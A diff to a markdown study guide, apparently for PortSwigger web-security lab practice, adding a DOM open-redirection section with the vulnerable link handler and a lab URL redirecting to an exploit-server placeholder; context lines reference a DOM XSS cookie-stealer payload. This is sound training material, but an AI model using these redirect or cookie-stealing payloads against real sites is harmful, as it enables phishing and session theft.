@@ -162,6 +162,7 @@ git-cola --repo 0ad900ad039b4591c0a4f91b00a600e7.web-security-academy.net/
 [DOM XSS AddEventListener Ads Message](#dom-xss-addeventlistener-ads-message)  
 [DOM XSS Eval Reflected Cookie Stealer](#reflected-dom-xss)  
 [DOM XSS LastviewedProduct Cookie](#dom-xss-lastviewedproduct-cookie)  
+[DOM Open Redirection](#dom-open-redirection)  
 
 ### Identify DOM-XSS  
 
@@ -430,6 +431,21 @@ If not, directly try to escape JSON with `"}; document.location="https://example
 ```  
 
 I am unable to get a working cookie stealer payload for this vulnerable lab.......
+
+### DOM Open Redirection
+
+Blog post contains the following link in `Back to Blog` functionality:
+
+```html
+<a href='#' onclick='returnURL' = /url=https?:\/\/.+)/.exec(location); if(returnUrl)location.href = returnUrl[1];else location.href = "/"'>Back to Blog</a>
+```
+
+`url` parameter ==> vulnerable to open redirection allowing you to change where the `Back to Blog` functionality takes the user to:
+
+```
+https://YOUR-LAB-ID.web-security-academy.net/post?postId=4&url=https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/
+```
+
 
 [PortSwigger Lab: DOM-based cookie manipulation](https://portswigger.net/web-security/dom-based/cookie-manipulation/lab-dom-cookie-manipulation)  
   
